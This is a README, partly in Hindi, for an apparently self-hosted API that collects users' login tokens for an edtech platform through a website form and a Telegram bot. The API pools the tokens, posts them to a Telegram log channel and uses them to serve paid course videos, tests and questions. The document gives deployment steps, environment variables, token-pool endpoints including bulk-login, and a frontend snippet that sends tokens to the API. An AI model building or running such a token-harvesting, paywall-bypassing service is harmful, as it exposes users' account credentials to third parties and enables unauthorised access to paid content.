# ⚡ RG-MAXX API v2

## 🔄 Complete Flow

```
PATH 1 — Website Login:
User enters credentials on your site
→ Your frontend calls POST /api/login (userId + token)
→ API fetches user's batches from RG server
→ Token + batches saved to pool
→ Telegram channel pe log sent
→ User's content is now accessible ✅

PATH 2 — Telegram Bot:
User sends "/add 123456 eyJ..." to your Telegram bot
→ Bot receives message
→ API fetches user's batches
→ Token + batches saved to pool
→ Telegram channel pe log sent
→ User's content is now accessible ✅
```

---

## 🚀 Deploy on Vercel

### Step 1: GitHub pe push karo
```bash
# ZIP extract karo, folder mein jao
npm install   # local test ke liye
```

### Step 2: Vercel pe deploy
```
vercel.com → New Project → Import your repo
```
**Ya CLI se:**
```bash
npm i -g vercel
vercel
```

### Step 3: Environment Variables set karo
Vercel Dashboard → Your Project → Settings → Environment Variables:

| Variable | Value |
|----------|-------|
| `TELEGRAM_BOT_TOKEN` | `7xxx:AAA...` (from @BotFather) |
| `TELEGRAM_LOG_CHANNEL_ID` | `-100123456789` |
| `ADMIN_SECRET` | `koi_bhi_string` |

### Step 4: Webhook register karo (IMPORTANT!)
Deploy ke baad ek baar ye URL open karo:
```
https://YOUR-VERCEL-URL.vercel.app/api/set-webhook
```
Response mein `"ok": true` aana chahiye. Ab Telegram bot ready hai! ✅

---

## 🤖 Telegram Bot Setup

1. **@BotFather** → `/newbot` → token milega
2. **Channel banao** → bot ko **Admin** banao (can post messages)
3. **Channel ID** pata karo:
   - Channel mein koi message bhejo
   - `https://api.telegram.org/botTOKEN/getUpdates` open karo
   - `channel_post.chat.id` wala value lao (e.g. `-1001234567890`)
4. Vercel environment variables mein daalo
5. `/api/set-webhook` call karo

**Bot use karna:**
User bot ko ye message bheje:
```
/add 123456 eyJ0eXAiOiJKV1Q...
```
Bot automatically:
- Token verify karega
- Batches fetch karega
- Pool mein add karega
- Telegram log bhejega

---

## 📡 API Endpoints

### Website Login
```http
POST /api/login
Content-Type: application/json

{ "userId": "123456", "token": "eyJ..." }
```
**Response:**
```json
{
  "success": true,
  "userId": "123456",
  "batchCount": 3,
  "batches": [
    { "id": "257", "name": "NEET 2025 Batch", "expiry": "2025-12-31" }
  ]
}
```

### Content APIs (auto-uses right token)
```
GET /api/subjects?courseid=257
GET /api/topics?courseid=257&subjectid=1
GET /api/concepts?courseid=257&subjectid=1&topicid=1
GET /api/videos?courseid=257&subjectid=1&topicid=1&conceptid=1
GET /api/video-details?course_id=257&video_id=12345
GET /api/tests?testseriesid=100&subject_id=1
GET /api/questions?url=https://...
```

### Pool Management
```
GET /api/status
GET /api/pool
GET /api/all-batches
GET /api/my-courses?userid=123
GET /api/add-token?userid=123&token=eyJ...
GET /api/remove-token?userid=123
GET /api/clear-pool?secret=YOUR_ADMIN_SECRET
POST /api/bulk-login   (body: [{userId, token}, ...])
```

### Telegram
```
GET /api/set-webhook        ← call once after deploy
POST /api/telegram-webhook  ← Telegram calls this automatically
```

---

## 💡 Frontend Integration Example

```javascript
// Jab user login kare apki website pe
async function onUserLogin(userId, token) {
  const response = await fetch('https://your-api.vercel.app/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ userId, token })
  });
  const data = await response.json();
  console.log('Batches:', data.batches);
  // Ab /api/subjects, /api/videos etc. call kar sakte ho
}
```
